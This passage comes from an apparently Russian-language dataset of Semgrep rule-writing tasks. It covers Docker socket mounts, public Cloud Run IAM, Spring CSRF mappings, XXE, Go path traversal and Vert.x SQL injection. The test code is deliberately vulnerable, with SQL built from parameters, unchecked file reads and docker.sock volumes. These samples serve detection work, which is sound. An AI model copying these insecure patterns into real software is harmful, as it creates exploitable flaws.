    "instruction": "Сгенерируй правило Semgrep для поиска: exposing-docker-socket-volume\nОписание уязвимости: Exposing host's Docker socket to containers via a volume. The owner of this socket is root. Giving someone access to it is equivalent to giving unrestricted root access to your host. Remove 'docker.sock' from volumes to prevent this.\nCWE: CWE-250: Execution with Unnecessary Privileges\nТип анализа: search\nЯзык: yaml",
    "input": "Требования:\n- Язык: yaml\n- Тип анализа: search\n- CWE: CWE-250: Execution with Unnecessary Privileges\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: exposing-docker-socket-volume.test.yaml\nversion: \"3.9\"\nservices:\n  service01:\n    image: nginx:alpine\n    # ok: exposing-docker-socket-volume\n    volumes:\n      - /tmp/foo:/tmp/foo\n      - /tmp/bar:/tmp/bar\n  service02:\n    image: my-worker-image:latest\n    # ruleid: exposing-docker-socket-volume\n    volumes:\n      - /tmp/foo:/tmp/foo\n      - /var/run/docker.sock:/var/run/docker.sock\n  service03:\n    image: mysql\n    # ruleid: exposing-docker-socket-volume\n    volumes:\n      - /var/run/docker.sock:/var/run/docker.sock\n      - /tmp/foo:/tmp/foo\n  service04:\n    image: redis\n    # ruleid: exposing-docker-socket-volume\n    volumes:\n      - /tmp/foo:/tmp/foo\n      - /var/run/docker.sock:/var/run/docker.sock\n      - /tmp/bar:/tmp/bar\n  service05:\n    image: ubuntu\n    # ruleid: exposing-docker-socket-volume\n    volumes:\n      - /tmp/foo:/tmp/foo\n      - /run/docker.sock:/run/docker.sock\n  service06:\n    image: debian:bullseye\n    # ruleid: exposing-docker-socket-volume\n    volumes:\n      - /run/docker.sock:/run/docker.sock\n      - /tmp/foo:/tmp/foo\n  service07:\n    image: debian:buster\n    # ruleid: exposing-docker-socket-volume\n    volumes:\n      - /tmp/foo:/tmp/foo\n      - /run/docker.sock:/run/docker.sock\n      - /tmp/bar:/tmp/bar\n  service08:\n    image: python:3.10\n    # ruleid: exposing-docker-socket-volume\n    volumes:\n      - /tmp/foo:/tmp/foo\n      - /var/run/docker.sock:/run/docker.sock\n  service09:\n    image: python:3.9\n    # ruleid: exposing-docker-socket-volume\n    volumes:\n      - /var/run/docker.sock:/run/docker.sock\n      - /tmp/foo:/tmp/foo\n  service10:\n    image: ruby:3\n    # ruleid: exposing-docker-socket-volume\n    volumes:\n      - /tmp/foo:/tmp/foo\n      - /var/run/docker.sock:/run/docker.sock\n      - /tmp/bar:/tmp/bar\n  service11:\n    image: postgres:14\n    # ruleid: exposing-docker-socket-volume\n    volumes:\n      - /tmp/foo:/tmp/foo\n      - /run/docker.sock:/var/run/docker.sock\n  service12:\n    image: random:thing\n    # ruleid: exposing-do  # Ограничиваем длину\n\nОпасные паттерны:\n• volumes:\n  - /var/run/docker.sock:/var/run/docker.sock\n  - /tmp/foo:/tmp/foo\n• volumes:\n  - /run/docker.sock:/run/docker.sock\n  - /tmp/bar:/tmp/bar\n• volumes:\n  - /var/run/docker.sock:/run/docker.sock\n  - /tmp/foo:/tmp/foo\n\nБезопасные паттерны:  \n• volumes:\n  - /tmp/foo:/tmp/foo\n• volumes:\n  - /tmp/bar:/tmp/bar\n• volumes:\n  - /tmp/foo\n  - /tmp/bar\n\nЛегенда аннотаций:\n- // ruleid:exposing-docker-socket-volume: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:exposing-docker-socket-volume: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: exposing-docker-socket-volume\n  patterns:\n  - pattern-inside: |\n      version: ...\n      ...\n  - pattern-either:\n    - pattern: |\n        volumes:\n          - ...\n          - /var/run/docker.sock:/var/run/docker.sock\n          - ...\n    - pattern: |\n        volumes:\n          - ...\n          - /run/docker.sock:/run/docker.sock\n          - ...\n    - pattern: |\n        volumes:\n          - ...\n          - /var/run/docker.sock:/run/docker.sock\n          - ...\n    - pattern: |\n        volumes:\n          - ...\n          - /run/docker.sock:/var/run/docker.sock\n          - ...\n    - pattern: |\n        volumes:\n          - ...\n          - /var/run/docker.sock\n          - ...\n    - pattern: |\n        volumes:\n          - ...\n          - /run/docker.sock\n          - ...\n    - pattern: |\n        volumes:\n          - ...\n          - ...\n            source: /var/run/docker.sock\n            ...\n          - ...\n    - pattern: |\n        volumes:\n          - ...\n          - ...\n            source: /run/docker.sock\n            ...\n          - ...\n  message: >-\n    Exposing host's Docker socket to containers via a volume. The owner of this\n    socket is root. Giving someone access to it is equivalent to giving\n    unrestricted root access to your host. Remove 'docker.sock' from volumes to\n    prevent this.\n  metadata:\n    references:\n    - https://docs.docker.com/compose/compose-file/compose-file-v3/#volume-configuration-reference\n    - https://cheatsheetseries.owasp.org/cheatsheets/Docker_Security_Cheat_Sheet.html#rule-1-do-not-expose-the-docker-daemon-socket-even-to-the-containers\n    category: security\n    technology:\n    - docker-compose\n    cwe:\n    - 'CWE-250: Execution with Unnecessary Privileges'\n    owasp:\n    - A06:2017 - Security Misconfiguration\n    - A05:2021 - Security Misconfiguration\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: HIGH\n    confidence: LOW\n  languages: [yaml]\n  severity: WARNING\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска конфигураций Docker Compose, где контейнеры получают доступ к сокету Docker через объем. Сокет Docker имеет владельца root и предоставляет неограниченный доступ к хост-системе при доступе извне контейнера. Правило ищет явное указание на использование путей /var/run/docker.sock или /run/docker.sock в конфигурации объема, а также косвенное указание через атрибут 'source', который может указывать на путь к сокету Docker.\n\n# Ключевые элементы:\n- ID: exposing-docker-socket-volume\n- Язык: yaml \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "exposing-docker-socket-volume",
      "language": "yaml",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения gcp-run-private-service-iam-member\nОписание уязвимости: Ensure that GCP Cloud Run services are not anonymously or publicly accessible\nCWE: CWE-1220: Insufficient Granularity of Access Control\nТип анализа: search\nЯзык: hcl",
    "input": "Требования:\n- Язык: hcl\n- Тип анализа: search\n- CWE: CWE-1220: Insufficient Granularity of Access Control\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: gcp-run-private-service-iam-member.tf\n# ok: gcp-run-private-service-iam-member\nresource \"google_cloud_run_service_iam_member\" \"pass1\" {\n  location = google_cloud_run_service.default.location\n  service = google_cloud_run_service.default.name\n  role = \"roles/viewer\"\n  member = \"user:jane@example.com\"\n}\n\n# ok: gcp-run-private-service-iam-member\nresource \"google_cloud_run_service_iam_member\" \"pass2\" {\n  location = google_cloud_run_service.default.location\n  service = google_cloud_run_service.default.name\n  role = \"roles/viewer\"\n  member = \"domain:example.com\"\n}\n\n# fail\n# ruleid: gcp-run-private-service-iam-member\nresource \"google_cloud_run_service_iam_member\" \"fail1\" {\n  location = google_cloud_run_service.default.location\n  service = google_cloud_run_service.default.name\n  role = \"roles/viewer\"\n  member  = \"allAuthenticatedUsers\"\n}\n\n# fail\n# ruleid: gcp-run-private-service-iam-member\nresource \"google_cloud_run_service_iam_member\" \"fail2\" {\n  location = google_cloud_run_service.default.location\n  service = google_cloud_run_service.default.name\n  role = \"roles/viewer\"\n  member  = \"allUsers\"\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• resource \"google_cloud_run_service_iam_member\" \"fail1\" { ... member = \"allAuthenticatedUsers\" ... }\n• resource \"google_cloud_run_service_iam_member\" \"fail2\" { ... member = \"allUsers\" ... }\n\nБезопасные паттерны:  \n• resource \"google_cloud_run_service_iam_member\" \"pass1\" { ... member = \"user:jane@example.com\" ... }\n• resource \"google_cloud_run_service_iam_member\" \"pass2\" { ... member = \"domain:example.com\" ... }\n\nЛегенда аннотаций:\n- // ruleid:gcp-run-private-service-iam-member: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:gcp-run-private-service-iam-member: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: gcp-run-private-service-iam-member\n  patterns:\n  - pattern: resource\n  - pattern-either:\n    - pattern-inside: |\n        resource \"google_cloud_run_service_iam_member\" \"...\" {\n        ...\n        member = \"allAuthenticatedUsers\"\n        ...\n        }\n    - pattern-inside: |\n        resource \"google_cloud_run_service_iam_member\" \"...\" {\n        ...\n        member = \"allUsers\"\n        ...\n        }\n  message: >-\n    Ensure that GCP Cloud Run services are not anonymously or publicly accessible\n  metadata:\n    owasp:\n    - A05:2017 - Broken Access Control\n    - A01:2021 - Broken Access Control\n    cwe:\n    - 'CWE-1220: Insufficient Granularity of Access Control'\n    category: security\n    technology:\n    - terraform\n    - gcp\n    references:\n    - https://owasp.org/Top10/A01_2021-Broken_Access_Control\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: LOW\n    confidence: LOW\n  languages: [hcl]\n  severity: WARNING\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска ресурсов Google Cloud Run IAM Member, которые предоставляют доступ всем аутентифицированным пользователям или всем пользователям. Паттерн ищет ресурсы типа 'google_cloud_run_service_iam_member' с атрибутом 'member', имеющим значение 'allAuthenticatedUsers' или 'allUsers'. Если такие ресурсы найдены, выдается предупреждение о недостаточной строгости контроля доступа.\n\n# Ключевые элементы:\n- ID: gcp-run-private-service-iam-member\n- Язык: hcl \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "gcp-run-private-service-iam-member",
      "language": "hcl",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения: unrestricted-request-mapping\nОписание уязвимости: Detected a method annotated with 'RequestMapping' that does not specify the HTTP method. CSRF protections are not enabled for GET, HEAD, TRACE, or OPTIONS, and by default all HTTP methods are allowed when the HTTP method is not explicitly specified. This means that a method that performs state changes could be vulnerable to CSRF attacks. To mitigate, add the 'method' field and specify the HTTP method (such as 'RequestMethod.POST').\nCWE: CWE-352: Cross-Site Request Forgery (CSRF)\nТип анализа: search\nЯзык: java",
    "input": "Требования:\n- Язык: java\n- Тип анализа: search\n- CWE: CWE-352: Cross-Site Request Forgery (CSRF)\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: unrestricted-request-mapping.java\n// cf. https://find-sec-bugs.github.io/bugs.htm#SPRING_CSRF_UNRESTRICTED_REQUEST_MAPPING\n\n@Controller\npublic class Controller {\n\n    // ruleid: unrestricted-request-mapping\n    @RequestMapping(\"/path\")\n    public void writeData() {\n        // State-changing operations performed within this method.\n    }\n\n    // ruleid: unrestricted-request-mapping\n    @RequestMapping(value = \"/path\")\n    public void writeData2() {\n        // State-changing operations performed within this method.\n    }\n\n    /**\n     * For methods without side-effects use either\n     * RequestMethod.GET, RequestMethod.HEAD, RequestMethod.TRACE, or RequestMethod.OPTIONS.\n     */\n    // ok: unrestricted-request-mapping\n    @RequestMapping(value = \"/path\", method = RequestMethod.GET)\n    public String readData() {\n        // No state-changing operations performed within this method.\n        return \"\";\n    }\n\n    /**\n     * For state-changing methods use either\n     * RequestMethod.POST, RequestMethod.PUT, RequestMethod.DELETE, or RequestMethod.PATCH.\n     */\n    // ok: unrestricted-request-mapping\n    @RequestMapping(value = \"/path\", method = RequestMethod.POST)\n    public void writeData3() {\n        // State-changing operations performed within this method.\n    }\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• @RequestMapping(\"/path\")\npublic void writeData() {\n    // State-changing operations performed within this method.\n}\n• @RequestMapping(value = \"/path\")\npublic void writeData2() {\n    // State-changing operations performed within this method.\n}\n\nБезопасные паттерны:  \n• @RequestMapping(value = \"/path\", method = RequestMethod.GET)\npublic String readData() {\n    // No state-changing operations performed within this method.\n    return \"\";\n}\n• @RequestMapping(value = \"/path\", method = RequestMethod.POST)\npublic void writeData3() {\n    // State-changing operations performed within this method.\n}\n\nЛегенда аннотаций:\n- // ruleid:unrestricted-request-mapping: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:unrestricted-request-mapping: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: unrestricted-request-mapping\n  patterns:\n  - pattern-inside: |\n      @RequestMapping(...)\n      $RETURNTYPE $METHOD(...) { ... }\n  - pattern-not-inside: |\n      @RequestMapping(..., method = $X, ...)\n      $RETURNTYPE $METHOD(...) { ... }\n  - pattern: |\n      RequestMapping\n  message: >-\n    Detected a method annotated with 'RequestMapping' that does not specify\n    the HTTP method. CSRF protections are not enabled for GET, HEAD, TRACE,\n    or OPTIONS, and by default all HTTP methods are allowed when the HTTP method\n    is not explicitly specified. This means that a method that performs state\n    changes could be vulnerable to CSRF attacks. To mitigate, add the 'method'\n    field and specify the HTTP method (such as 'RequestMethod.POST').\n  severity: WARNING\n  metadata:\n    cwe:\n    - 'CWE-352: Cross-Site Request Forgery (CSRF)'\n    owasp:\n    - A01:2021 - Broken Access Control\n    source-rule-url: https://find-sec-bugs.github.io/bugs.htm#SPRING_CSRF_UNRESTRICTED_REQUEST_MAPPING\n    references:\n    - https://find-sec-bugs.github.io/bugs.htm#SPRING_CSRF_UNRESTRICTED_REQUEST_MAPPING\n    category: security\n    technology:\n    - spring\n    cwe2022-top25: true\n    cwe2021-top25: true\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: MEDIUM\n    confidence: LOW\n  languages: [java]\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска методов, аннотированных '@RequestMapping', которые не указывают явно метод HTTP. По умолчанию Spring позволяет использовать любой метод HTTP, если он не указан явно, что может привести к уязвимостям межсайтовых запросов (CSRF). Правило использует шаблон, который ищет методы с аннотацией '@RequestMapping' без явного указания метода HTTP, но исключает случаи, когда метод явно указан через параметр 'method'. Это позволяет обнаружить потенциально небезопасные методы, выполняющие изменения состояния, без защиты от CSRF.\n\n# Ключевые элементы:\n- ID: unrestricted-request-mapping\n- Язык: java \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "unrestricted-request-mapping",
      "language": "java",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения xmlinputfactory-dtd-enabled\nОписание уязвимости: XMLInputFactory being instantiated without calling the setProperty functions that are generally used for disabling entity processing. User controlled data in XML Document builder can result in XML Internal Entity Processing vulnerabilities like the disclosure of confidential data, denial of service, Server Side Request Forgery (SSRF), port scanning. Make sure to disable entity processing functionality.\nCWE: CWE-611: Improper Restriction of XML External Entity Reference\nТип анализа: search\nЯзык: scala",
    "input": "Требования:\n- Язык: scala\n- Тип анализа: search\n- CWE: CWE-611: Improper Restriction of XML External Entity Reference\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: xmlinputfactory-dtd-enabled.scala\npackage org.test.test\n\nimport java.io.{File, FileReader}\nimport javax.xml.stream.XMLInputFactory\n\nclass Foo {\n\n  def run1(file: String) = {\n    // ruleid: xmlinputfactory-dtd-enabled\n    val factory = XMLInputFactory.newInstance()\n    val fileReader = new FileReader(file)\n    val xmlReader = factory.createXMLStreamReader(fileReader)\n    doSmth(xmlReader)\n  }\n\n  def run2(file: String) = {\n    // ruleid: xmlinputfactory-dtd-enabled\n    val factory = XMLInputFactory.newFactory()\n    val fileReader = new FileReader(file)\n    val xmlReader = factory.createXMLStreamReader(fileReader)\n    doSmth(xmlReader)\n  }\n\n  def okRun1(file: String) = {\n    // ok: xmlinputfactory-dtd-enabled\n    val factory = XMLInputFactory.newInstance\n    factory.setProperty(\"javax.xml.stream.isSupportingExternalEntities\", false)\n    val fileReader = new FileReader(file)\n    val xmlReader = factory.createXMLStreamReader(fileReader)\n    doSmth(xmlReader)\n  }\n\n  def okRun2(file: String) = {\n    // ok: xmlinputfactory-dtd-enabled\n    val factory = XMLInputFactory.newFactory()\n    factory.setProperty(\"javax.xml.stream.isSupportingExternalEntities\", false)\n    val fileReader = new FileReader(file)\n    val xmlReader = factory.createXMLStreamReader(fileReader)\n    doSmth(xmlReader)\n  }\n\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• val factory = XMLInputFactory.newInstance(); val fileReader = new FileReader(file); val xmlReader = factory.createXMLStreamReader(fileReader); doSmth(xmlReader);\n• val factory = XMLInputFactory.newFactory(); val fileReader = new FileReader(file); val xmlReader = factory.createXMLStreamReader(fileReader); doSmth(xmlReader);\n\nБезопасные паттерны:  \n• val factory = XMLInputFactory.newInstance(); factory.setProperty(\"javax.xml.stream.isSupportingExternalEntities\", false); val fileReader = new FileReader(file); val xmlReader = factory.createXMLStream\n• val factory = XMLInputFactory.newFactory(); factory.setProperty(\"javax.xml.stream.isSupportingExternalEntities\", false); val fileReader = new FileReader(file); val xmlReader = factory.createXMLStreamR\n\nЛегенда аннотаций:\n- // ruleid:xmlinputfactory-dtd-enabled: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:xmlinputfactory-dtd-enabled: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: xmlinputfactory-dtd-enabled\n  patterns:\n  - pattern-not-inside: | # nosemgrep: slow-pattern-top-ellipsis\n      ...\n      $XMLFACTORY.setProperty(\"javax.xml.stream.isSupportingExternalEntities\", false)\n  - pattern-either:\n    - pattern: $XMLFACTORY = XMLInputFactory.newFactory(...)\n    - pattern: $XMLFACTORY = XMLInputFactory.newInstance(...)\n    - pattern: $XMLFACTORY = new XMLInputFactory(...)\n  message: >-\n    XMLInputFactory being instantiated without calling the setProperty functions that are generally used\n    for disabling entity processing.\n    User controlled data in XML Document builder can result in XML Internal Entity Processing vulnerabilities\n    like the disclosure of confidential data, denial of service, Server Side Request Forgery (SSRF), port\n    scanning.\n    Make sure to disable entity processing functionality.\n  languages: [scala]\n  severity: WARNING\n  metadata:\n    cwe:\n    - 'CWE-611: Improper Restriction of XML External Entity Reference'\n    owasp:\n    - A04:2017 - XML External Entities (XXE)\n    - A05:2021 - Security Misconfiguration\n    source-rule-url: https://cheatsheetseries.owasp.org//cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html\n    category: security\n    technology:\n    - scala\n    confidence: HIGH\n    references:\n    - https://owasp.org/Top10/A05_2021-Security_Misconfiguration\n    cwe2022-top25: true\n    cwe2021-top25: true\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: MEDIUM\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска случаев, когда объект XMLInputFactory создается без вызова функции setProperty с параметром \"javax.xml.stream.isSupportingExternalEntities\", который обычно используется для отключения обработки внешних сущностей. В первом примере (run1 и run2) объекты создаются напрямую через методы newInstance или newFactory без последующего вызова setProperty, что является потенциальной угрозой XXE-уязвимости. Во втором примере (okRun1 и okRun2) после создания объекта вызывается метод setProperty, что делает код безопасным.\n\n# Ключевые элементы:\n- ID: xmlinputfactory-dtd-enabled\n- Язык: scala \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "xmlinputfactory-dtd-enabled",
      "language": "scala",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Напиши Semgrep правило для обнаружения: filepath-clean-misuse\nОписание уязвимости: `Clean` is not intended to sanitize against path traversal attacks. This function is for finding the shortest path name equivalent to the given input. Using `Clean` to sanitize file reads may expose this application to path traversal attacks, where an attacker could access arbitrary files on the server. To fix this easily, write this: `filepath.FromSlash(path.Clean(\"/\"+strings.Trim(req.URL.Path, \"/\")))` However, a better solution is using the `SecureJoin` function in the package `filepath-securejoin`. See https://pkg.go.dev/github.com/cyphar/filepath-securejoin#section-readme.\nCWE: CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')\nТип анализа: taint\nЯзык: go\nИсточники (sources): определены в правиле\nСинки (sinks): определены в правиле\nСпособы санитации: определены в правиле",
    "input": "Требования:\n- Язык: go\n- Тип анализа: taint\n- CWE: CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')\n- Серьезность: ERROR\n\nКонтекст кода:\n// File: filepath-clean-misuse.go\npackage main\n\nimport (\n\t\"io/ioutil\"\n\t\"log\"\n\t\"net/http\"\n\t\"path/filepath\"\n\t\"path\"\n\t\"strings\"\n)\n\nconst root = \"/tmp\"\n\nfunc main() {\n\tmux := http.NewServeMux()\n\tmux.HandleFunc(\"/bad1\", func(w http.ResponseWriter, r *http.Request) {\n\t\t// ruleid: filepath-clean-misuse\n\t\tfilename := filepath.Clean(r.URL.Path)\n\t\tfilename := filepath.Join(root, strings.Trim(filename, \"/\"))\n\t\tcontents, err := ioutil.ReadFile(filename)\n\t\tif err != nil {\n\t\t\tw.WriteHeader(http.StatusNotFound)\n\t\t\treturn\n\t\t}\n\t\tw.Write(contents)\n\t})\n\n\tmux.HandleFunc(\"/bad2\", func(w http.ResponseWriter, r *http.Request) {\n\t\t// ruleid: filepath-clean-misuse\n\t\tfilename := path.Clean(r.URL.Path)\n\t\tfilename := filepath.Join(root, strings.Trim(filename, \"/\"))\n\t\tcontents, err := ioutil.ReadFile(filename)\n\t\tif err != nil {\n\t\t\tw.WriteHeader(http.StatusNotFound)\n\t\t\treturn\n\t\t}\n\t\tw.Write(contents)\n\t})\n\n\tmux.HandleFunc(\"/ok\", func(w http.ResponseWriter, r *http.Request) {\n\t\tfilename := r.URL.Path\n\t\t// ok: filepath-clean-misuse\n\t\tfilename := filepath.Join(root, strings.Trim(filename, \"/\"))\n\t\tcontents, err := ioutil.ReadFile(filename)\n\t\tif err != nil {\n\t\t\tw.WriteHeader(http.StatusNotFound)\n\t\t\treturn\n\t\t}\n\t\tw.Write(contents)\n\t})\n\n\tmux.HandleFunc(\"/ok2\", func(w http.ResponseWriter, r *http.Request) {\n\t\t// ok: filepath-clean-misuse\n\t\tfilename := path.Clean(\"/\" + r.URL.Path)\n\t\tfilename := filepath.Join(root, strings.Trim(filename, \"/\"))\n\t\tcontents, err := ioutil.ReadFile(filename)\n\t\tif err != nil {\n\t\t\tw.WriteHeader(http.StatusNotFound)\n\t\t\treturn\n\t\t}\n\t\tw.Write(contents)\n\t})\n\n\tserver := &http.Server{\n\t\tAddr:    \"127.0.0.1:50000\",\n\t\tHandler: mux,\n\t}\n\n\tlog.Fatal(server.ListenAndServe())\n}\n\n// TODO\n// func NewHandlerWithDefault(root http.FileSystem, handler http.Handler, defaultPath string, gatewayDomains []string) http.Handler {\n// \treturn http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {\n// \t\tif isGatewayRequest(r) {\n// \t\t\t// s3 signed request reaching the ui handler, return an error respon  # Ограничиваем длину\n\nОпасные паттерны:\n• filename := filepath.Clean(r.URL.Path)\n• filename := path.Clean(r.URL.Path)\n\nБезопасные паттерны:  \n• filename := r.URL.Path; filename := filepath.Join(root, strings.Trim(filename, \"/\"))\n• filename := path.Clean(\"/\" + r.URL.Path); filename := filepath.Join(root, strings.Trim(filename, \"/\"))\n\nЛегенда аннотаций:\n- // ruleid:filepath-clean-misuse: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:filepath-clean-misuse: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: filepath-clean-misuse\n  message: >-\n    `Clean` is not intended to sanitize against path traversal attacks.\n    This function is for finding the shortest path name equivalent to the given input.\n    Using `Clean` to sanitize file reads may expose this application to\n    path traversal attacks, where an attacker could access arbitrary files on the server.\n    To fix this easily, write this: `filepath.FromSlash(path.Clean(\"/\"+strings.Trim(req.URL.Path, \"/\")))`\n    However, a better solution is using the `SecureJoin` function in the package `filepath-securejoin`.\n    See https://pkg.go.dev/github.com/cyphar/filepath-securejoin#section-readme.\n  severity: ERROR\n  languages: [go]\n  mode: taint\n  pattern-sources:\n  - patterns:\n    - pattern-either:\n      - pattern: |\n          ($REQUEST : *http.Request).$ANYTHING\n      - pattern: |\n          ($REQUEST : http.Request).$ANYTHING\n    - metavariable-regex:\n        metavariable: $ANYTHING\n        regex: ^(BasicAuth|Body|Cookie|Cookies|Form|FormValue|GetBody|Host|MultipartReader|ParseForm|ParseMultipartForm|PostForm|PostFormValue|Referer|RequestURI|Trailer|TransferEncoding|UserAgent|URL)$\n  pattern-sinks:\n  - patterns:\n    - pattern-either:\n      - pattern: filepath.Clean($...INNER)\n      - pattern: path.Clean($...INNER)\n  pattern-sanitizers:\n  - pattern-either:\n    - pattern: |\n        \"/\" + ...\n  fix: filepath.FromSlash(filepath.Clean(\"/\"+strings.Trim($...INNER, \"/\")))\n  options:\n    interfile: true\n  metadata:\n    references:\n    - https://pkg.go.dev/path#Clean\n    - http://technosophos.com/2016/03/31/go-quickly-cleaning-filepaths.html\n    - https://labs.detectify.com/2021/12/15/zero-day-path-traversal-grafana/\n    - https://dzx.cz/2021/04/02/go_path_traversal/\n    - https://pkg.go.dev/github.com/cyphar/filepath-securejoin#section-readme\n    cwe:\n    - \"CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')\"\n    owasp:\n    - A05:2017 - Broken Access Control\n    - A01:2021 - Broken Access Control\n    category: security\n    technology:\n    - go\n    cwe2022-top25: true\n    cwe2021-top25: true\n    subcategory:\n    - vuln\n    likelihood: MEDIUM\n    impact: MEDIUM\n    confidence: MEDIUM\n    interfile: true\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования функции Clean из пакета path или filepath в контексте чтения файлов, что может привести к атакам типа path traversal. Правило проверяет наличие вызова этих функций в сочетании с источником данных, полученных от HTTP-запроса, и отсутствием явной предварительной обработки пути через FromSlash или SecureJoin. В опасных примерах функция Clean используется напрямую для подготовки пути перед чтением файла, тогда как безопасные примеры либо используют FromSlash, либо вообще не применяют функцию Clean.\n\n# Ключевые элементы:\n- ID: filepath-clean-misuse\n- Язык: go \n- Тип: vuln\n- Серьезность: ERROR",
    "metadata": {
      "rule_id": "filepath-clean-misuse",
      "language": "go",
      "severity": "ERROR",
      "rule_type": "vuln",
      "mode": "taint",
      "is_validation": true
    }
  },
  {
    "instruction": "Разработай правило Semgrep для выявления: vertx-sqli\nОписание уязвимости: Detected a formatted string in a SQL statement. This could lead to SQL injection if variables in the SQL statement are not properly sanitized. Use a prepared statements (java.sql.PreparedStatement) instead. You can obtain a PreparedStatement using 'connection.prepareStatement'.\nCWE: CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')\nТип анализа: search\nЯзык: java",
    "input": "Требования:\n- Язык: java\n- Тип анализа: search\n- CWE: CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: vertx-sqli.java\npackage testcode.sqli;\n\nimport io.vertx.sqlclient.SqlClient;\nimport io.vertx.sqlclient.SqlConnection;\n\npublic class VertxSqlClient {\n\n    public void injection1(SqlClient client, String injection) {\n        // ruleid: vertx-sqli\n        client.query(injection);\n    }\n\n    public void injection2(SqlClient client, String injection) {\n        // ruleid: vertx-sqli\n        client.preparedQuery(injection);\n    }\n\n    public void injection3(SqlConnection conn, String injection) {\n        // ruleid: vertx-sqli\n        conn.prepare(injection);\n    }\n\n    public void injection4(SqlConnection conn, String injection) {\n        // ruleid: vertx-sqli\n        conn.prepare(injection, null);\n    }\n\n    public void falsePositive1(SqlClient client) {\n        String constantValue = \"SELECT * FROM test\";\n        // ok: vertx-sqli\n        client.query(constantValue);\n    }\n\n    public void falsePositive2(SqlConnection conn) {\n        String constantValue = \"SELECT * FROM test\";\n        // ok: vertx-sqli\n        conn.query(constantValue);\n    }\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• client.query(injection);\n• client.preparedQuery(injection);\n• conn.prepare(injection);\n\nБезопасные паттерны:  \n• String constantValue = \"SELECT * FROM test\"; client.query(constantValue);\n• String constantValue = \"SELECT * FROM test\"; conn.query(constantValue);\n\nЛегенда аннотаций:\n- // ruleid:vertx-sqli: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:vertx-sqli: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: vertx-sqli\n  message: >-\n    Detected a formatted string in a SQL statement. This could lead to SQL\n    injection if variables in the SQL statement are not properly sanitized.\n    Use a prepared statements (java.sql.PreparedStatement) instead. You\n    can obtain a PreparedStatement using 'connection.prepareStatement'.\n  languages: [java]\n  severity: WARNING\n  patterns:\n  - pattern-either:\n    - patterns:\n      - pattern-either:\n        - pattern-inside: |\n            String $SQL = $X + $Y;\n            ...\n        - pattern-inside: |\n            String $SQL = String.format(...);\n            ...\n        - pattern-inside: |\n            $TYPE $FUNC(...,String $SQL,...) {\n              ...\n            }\n      - pattern-not-inside: |\n          String $SQL = \"...\" + \"...\";\n          ...\n      - pattern: $SC.$METHOD($SQL,...)\n    - pattern: |\n        $SC.$METHOD(String.format(...),...);\n    - pattern: |\n        $SC.$METHOD($X + $Y,...);\n  - pattern-either:\n    - pattern-inside: |\n        SqlClient $SC = ...;\n        ...\n    - pattern-inside: |\n        SqlConnection $SC = ...;\n        ...\n    - pattern-inside: |\n        $TYPE $FUNC(...,SqlClient $SC,...) {\n          ...\n        }\n    - pattern-inside: |\n        $TYPE $FUNC(...,SqlConnection $SC,...) {\n          ...\n        }\n  - pattern-not: |\n      $SC.$METHOD(\"...\" + \"...\",...);\n  - metavariable-regex:\n      metavariable: $METHOD\n      regex: ^(query|preparedQuery|prepare)$\n  metadata:\n    cwe:\n    - \"CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')\"\n    category: security\n    technology:\n    - vertx\n    owasp:\n    - A01:2017 - Injection\n    - A03:2021 - Injection\n    references:\n    - https://owasp.org/Top10/A03_2021-Injection\n    cwe2022-top25: true\n    cwe2021-top25: true\n    subcategory:\n    - audit\n    likelihood: 